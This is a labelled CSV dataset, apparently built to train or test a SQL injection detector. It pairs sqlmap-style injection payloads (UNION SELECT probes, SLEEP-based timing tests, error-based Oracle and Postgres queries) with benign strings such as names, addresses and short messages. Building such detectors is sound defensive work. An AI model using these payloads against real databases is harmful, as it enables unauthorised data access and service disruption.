payload,label
"' IN BOOLEAN MODE) UNION ALL SELECT NULL,NULL#",1
""") AS OVCu WHERE 7328=7328 AND ELT(3758=3758,SLEEP(5))-- yPHs",1
aguistin,0
mirror,0
01011983,0
"TAAm' IN BOOLEAN MODE) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
""") AND 3579=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",1
"-7612' OR (SELECT (CASE WHEN (7096=7096) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7096) END) FROM DUAL) IS NULL AND 'LaEQ' LIKE 'LaEQ",1
"sexC"") HAVING 8763=2795 AND (""FdQQ"" LIKE ""FdQQ",1
"-4149'))) UNION ALL SELECT 3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072,3072-- znvq",1
"plaza museo, 45, 6e",0
"https://keystrokebiometrics.xyz:443/' IN BOOLEAN MODE) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wUPe",1
32452,0
DtRW RLIKE SLEEP(5)# CmtG,1
HI BABE U R MOST LIKELY TO BE IN BED BUT IM SO SORRY ABOUT TONIGHT! I REALLY WANNA SEE U TOMORROW SO CALL ME AT 9. LOVE ME XXX,0
vyHv')) AS YEBy WHERE 2634=2634 AND 2891=2093#,1
' IN BOOLEAN MODE) AND (SELECT 2539 FROM (SELECT(SLEEP(5)))Yfsw)#,1
"UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- GFjG",1
1942833835979671,0
docken.carmi@soyrojo.so,0
aylln tamallangos,0
"sqlmap/1.4.4#stable (http://sqlmap.org)"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#",1
712,0
Some friends want me to drive em someplace probably take a while,0
cbHd)) OR 8285=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ((3180=3180,1
hinkel,0
"coslada 83, 4g",0
dieciseisavo,0
2613,0
) AS cZdl WHERE 6689=6689 AND 5179=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (5179=5179) THEN BITCOUNT(BITSTRING_TO_BINARY((CHR(49)))) ELSE BITCOUNT(BITSTRING_TO_BINARY((CHR(48)))) END))::varchar||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC)-- jGVa,1
"https://keystrokebiometrics.xyz:443/ UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"-2399""))) OR 4834=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (4834=4834) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AND (((""rUjB""=""rUjB",1
"TAAm"" WHERE 2307=2307 OR 7475=LIKE(CAST(X'41424344454647' AS TEXT),UPPER(HEX(RANDOMBLOB(500000000/2))))-- Vlul",1
"1""  )  )   )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( ""ugtw"" = ""ugtw",1
